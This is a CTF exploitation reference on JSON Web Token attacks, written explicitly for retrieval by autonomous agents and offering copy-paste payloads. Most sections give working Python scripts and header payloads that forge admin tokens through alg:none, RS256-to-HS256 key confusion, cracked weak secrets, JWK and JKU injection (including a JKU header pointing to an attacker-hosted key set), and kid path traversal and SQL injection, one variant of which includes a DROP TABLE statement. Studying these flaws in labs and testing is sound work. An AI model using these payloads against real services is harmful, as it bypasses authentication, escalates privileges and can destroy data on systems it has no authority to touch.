# JWT (JSON Web Token) Attacks - CTF Exploitation Reference

> **Document Purpose:** Actionable JWT attack techniques for CTF challenges. Designed for autonomous agent retrieval with copy-paste payloads, algorithm attacks, and signature bypass methods.

---

## 1. QUICK REFERENCE: JWT Structure

> **When to use this section:** You encounter JWT tokens in cookies, headers, or responses.

### 1.1 JWT Basics

**Tags:** `jwt, structure, basics, format`

**JWT Format:**
```
HEADER.PAYLOAD.SIGNATURE
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Header (Base64-decoded):**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload (Base64-decoded):**
```json
{
  "user": "guest",
  "role": "user",
  "iat": 1616239022,
  "exp": 1616242622
}
```

**Signature:**
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

**Agent Takeaway:**
- JWT is Base64URL encoded (not encrypted!)
- Payload visible by decoding
- Signature prevents tampering (if implemented correctly)

---

### 1.2 JWT Detection and Decoding

**Tags:** `jwt, detection, decoding, recognition`

**Where JWTs Appear:**
- Cookie: `token=eyJ...`
- Authorization header: `Bearer eyJ...`
- URL parameter: `?token=eyJ...`
- Response body

**Quick Decode (Online):**
```
https://jwt.io/
https://token.dev/
```

**Command Line Decode:**
```bash
# Decode header
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d

# Decode payload
echo "eyJ1c2VyIjoiZ3Vlc3QifQ" | base64 -d
```

**Python Decode:**
```python
import base64, json

def decode_jwt(token):
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return header, payload
```

**Agent Takeaway:**
- Look for tokens starting with `eyJ`
- Always decode header to see algorithm
- Decode payload to see user claims (role, admin, etc.)

---

## 2. JWT ATTACK: Algorithm None

> **When to use this section:** Server accepts tokens with algorithm set to "none".

### 2.1 Algorithm None Attack

**Tags:** `jwt, none, algorithm, bypass, signature`

**The Vulnerability:**
Server accepts `"alg": "none"` which means no signature required.

**Attack Steps:**

**Step 1: Decode original token**
```json
Header: {"alg": "HS256", "typ": "JWT"}
Payload: {"user": "guest", "role": "user"}
```

**Step 2: Modify header and payload**
```json
Header: {"alg": "none", "typ": "JWT"}
Payload: {"user": "admin", "role": "admin"}
```

**Step 3: Create new token**
```
BASE64(header).BASE64(payload).
```
**Note:** Empty signature (just trailing dot)

**Variations to Try:**
```json
{"alg": "none"}
{"alg": "None"}
{"alg": "NONE"}
{"alg": "nOnE"}
```

**Python Script:**
```python
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

token = f"{b64url(header)}.{b64url(payload)}."
print(token)
```

**Agent Takeaway:**
- Set `"alg": "none"` in header
- Remove or empty the signature
- Try case variations: `None`, `NONE`, `nOnE`

---

## 3. JWT ATTACK: Algorithm Confusion (RS256 → HS256)

> **When to use this section:** Server uses RS256 but can be tricked into HS256.

### 3.1 RS256 to HS256 Confusion

**Tags:** `jwt, rs256, hs256, confusion, key, bypass`

**The Vulnerability:**
- Server uses RS256 (asymmetric) with public/private key pair
- Attacker changes to HS256 (symmetric)
- Server uses public key as HMAC secret

**Attack Steps:**

**Step 1: Get the public key**
```
/.well-known/jwks.json
/public.pem
/key.pem
/publickey
```

**Step 2: Change algorithm to HS256**
```json
{"alg": "HS256", "typ": "JWT"}
```

**Step 3: Sign with public key as HMAC secret**
```python
import jwt

public_key = open('public.pem').read()
payload = {"user": "admin", "role": "admin"}
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
```

**Step 4: Send forged token**

**Python Script:**
```python
import jwt
import base64

# Get public key (may need to download from server)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Forge token with admin privileges
payload = {"user": "admin", "role": "admin", "iat": 1616239022}

# Sign with public key as HS256 secret
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
```

**Agent Takeaway:**
- Look for public key on server
- Change alg: RS256 → HS256
- Sign with public key as HMAC secret

---

## 4. JWT ATTACK: Weak Secret Key

> **When to use this section:** JWT uses HS256 with a weak/guessable secret.

### 4.1 Cracking JWT Secrets

**Tags:** `jwt, crack, secret, bruteforce, hashcat`

**Common Weak Secrets:**
```
secret
password
key
123456
your-256-bit-secret
secret-key
jwt-secret
supersecret
admin
```

**Using jwt_tool:**
```bash
python3 jwt_tool.py TOKEN -C -d wordlist.txt
```

**Using hashcat:**
```bash
# Format: hashcat mode 16500
hashcat -m 16500 jwt.txt wordlist.txt
```

**Using John the Ripper:**
```bash
john --wordlist=wordlist.txt jwt.txt
```

**Online Tools:**
```
https://jwt.io/  (with manual testing)
```

**After Cracking - Forge Token:**
```python
import jwt

secret = "cracked_secret"
payload = {"user": "admin", "role": "admin"}
token = jwt.encode(payload, secret, algorithm='HS256')
print(token)
```

**Agent Takeaway:**
- Many CTFs use weak/common secrets
- Try common passwords first
- Once cracked, forge any token

---

### 4.2 Common JWT Secrets Wordlist

**Tags:** `jwt, secrets, wordlist, common`

**Top JWT Secrets to Try:**
```
secret
password
key
secretkey
secret_key
jwt_secret
jwt-secret
jwtsecret
supersecret
admin
12345678
password123
your-256-bit-secret
changeme
test
default
private
privatekey
mysecret
verysecret
```

**Agent Takeaway:**
- Start with common secrets before heavy cracking
- CTF challenges often use obvious secrets
- Check challenge hints for secret clues

---

## 5. JWT ATTACK: JWK Injection

> **When to use this section:** Server extracts key from JWT itself.

### 5.1 JWK Header Injection

**Tags:** `jwt, jwk, injection, key, bypass`

**The Vulnerability:**
Server uses key from `jwk` header parameter instead of trusted key.

**Attack Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "YOUR_PUBLIC_KEY_N",
    "e": "AQAB"
  }
}
```

**Attack Steps:**
1. Generate your own RSA key pair
2. Embed public key in JWT header as JWK
3. Sign with your private key
4. Server verifies using embedded public key

**Python Script:**
```python
from jwcrypto import jwk, jwt
import json

# Generate key pair
key = jwk.JWK.generate(kty='RSA', size=2048)
public_key = json.loads(key.export_public())

# Create JWT with embedded JWK
header = {"alg": "RS256", "typ": "JWT", "jwk": public_key}
claims = {"user": "admin", "role": "admin"}

token = jwt.JWT(header=header, claims=claims)
token.make_signed_token(key)
print(token.serialize())
```

**Agent Takeaway:**
- Embed your own public key in header
- Sign with corresponding private key
- Server trusts embedded key

---

### 5.2 JKU Header Injection

**Tags:** `jwt, jku, injection, url, bypass`

**The Vulnerability:**
Server fetches key from URL in `jku` header parameter.

**Attack Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/jwks.json"
}
```

**Attack Steps:**
1. Host JWKS file on attacker server
2. Set `jku` to attacker URL
3. Sign with your private key
4. Server fetches key from your server

**Attacker's jwks.json:**
```json
{
  "keys": [
    {
      "kty": "RSA",
      "n": "YOUR_PUBLIC_KEY_N",
      "e": "AQAB",
      "kid": "key1"
    }
  ]
}
```

**Agent Takeaway:**
- Host your own JWKS endpoint
- Server fetches and uses your key
- May require SSRF or URL bypass

---

## 6. JWT ATTACK: KID Manipulation

> **When to use this section:** JWT contains `kid` (Key ID) header.

### 6.1 KID Path Traversal

**Tags:** `jwt, kid, path-traversal, injection`

**The Vulnerability:**
Server uses `kid` to locate key file without sanitization.

**Attack Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"
}
```

**Sign with empty string (content of /dev/null):**
```python
import jwt

payload = {"user": "admin", "role": "admin"}
token = jwt.encode(payload, "", algorithm='HS256')
print(token)
```

**Other KID Attacks:**
```json
{"kid": "../../../etc/passwd"}     # Known file content as secret
{"kid": "/dev/null"}               # Empty secret
{"kid": "key'; DROP TABLE keys;--"}  # SQL injection
```

**Agent Takeaway:**
- `kid` may be used in file path or SQL query
- Try path traversal to known files
- Empty key via /dev/null

---

### 6.2 KID SQL Injection

**Tags:** `jwt, kid, sql-injection, bypass`

**Attack Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key' UNION SELECT 'secret' -- "
}
```

**Then sign with 'secret' as the key.**

**Agent Takeaway:**
- If kid is used in SQL query, inject
- Return a known secret value
- Sign with that value

---

## 7. CTF-SPECIFIC JWT STRATEGIES

> **When to use this section:** Solving JWT challenges in CTF.

### 7.1 JWT CTF Playbook

**Tags:** `jwt, ctf, playbook, workflow`

**Step 1: Identify and Decode JWT**
```
Look for: eyJ... tokens
Decode: header and payload at jwt.io
Note: algorithm, user claims, role
```

**Step 2: Check for alg:none**
```json
{"alg": "none"} + modify payload + empty signature
```

**Step 3: Try Common Secrets**
```
secret, password, key, jwt_secret
Sign modified payload with guessed secret
```

**Step 4: Check for RS256 Confusion**
```
Find public key
Change to HS256
Sign with public key
```

**Step 5: Check for JWK/JKU Injection**
```
Add jwk with your key to header
Or jku pointing to your server
```

**Step 6: Check KID Attacks**
```
Path traversal: ../../dev/null
SQL injection: ' UNION SELECT 'secret
```

**Agent Takeaway:**
- Always decode JWT first
- Try alg:none and common secrets
- Check for header injection possibilities

---

### 7.2 JWT Attack Decision Tree

**Tags:** `jwt, decision-tree, workflow`

```
START: JWT identified

STEP 1: Decode and analyze
├── Header: Check algorithm (HS256, RS256, none)
├── Payload: Note user/role claims
└── Signature: Will need to forge or bypass

STEP 2: Try alg:none
├── Set alg: "none" (and variations)
├── Modify payload (user: admin)
└── Empty signature

STEP 3: If HS256 → Try weak secrets
├── Common passwords
├── Crack with hashcat/john
└── If cracked → forge token

STEP 4: If RS256 → Try confusion attack
├── Find public key
├── Change to HS256
└── Sign with public key as secret

STEP 5: Check header injections
├── jwk: Embed your key
├── jku: Point to your JWKS
└── kid: Path traversal or SQLi
```

---

## 8. SUMMARY: JWT Attack Quick Reference

**Decode JWT:**
```bash
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d
```

**Alg:None Attack:**
```json
Header: {"alg": "none", "typ": "JWT"}
Token: base64(header).base64(payload).
```

**Common Weak Secrets:**
```
secret, password, key, jwt_secret, 123456
```

**RS256 → HS256 Confusion:**
```python
jwt.encode(payload, public_key, algorithm='HS256')
```

**JWK Injection:**
```json
{"alg": "RS256", "jwk": {YOUR_PUBLIC_KEY}}
```

**KID Path Traversal:**
```json
{"kid": "../../../../../../dev/null"}
# Sign with empty string
```

**Python Forge Token:**
```python
import jwt
token = jwt.encode({"user": "admin"}, "secret", algorithm="HS256")
```
